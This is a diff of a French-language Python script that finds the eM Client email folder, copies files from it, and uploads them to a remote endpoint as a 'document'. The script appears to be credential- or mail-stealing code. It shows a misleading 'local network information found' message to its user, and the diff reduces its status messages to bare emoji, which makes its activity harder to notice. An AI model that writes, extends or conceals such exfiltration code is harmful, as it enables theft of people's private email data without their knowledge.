@@ -82,7 +82,7 @@ def exporter_fichiers_specifiques_et_envoyer():
     try:
         emclient_path = chercher_dossier_emclient()
         if not emclient_path:
-            print("❌ Dossier eM Client introuvable.")
+            print("❌")
             return
 
         temp_dir = tempfile.mkdtemp()
@@ -124,7 +124,7 @@ def exporter_fichiers_specifiques_et_envoyer():
                 files={"document": f}
             )
 
-        print("✅ Informations Réseau Locale trouvée.")
+        print("✅")
     except Exception as e:
         print("❌ Erreur :", e)
     finally:
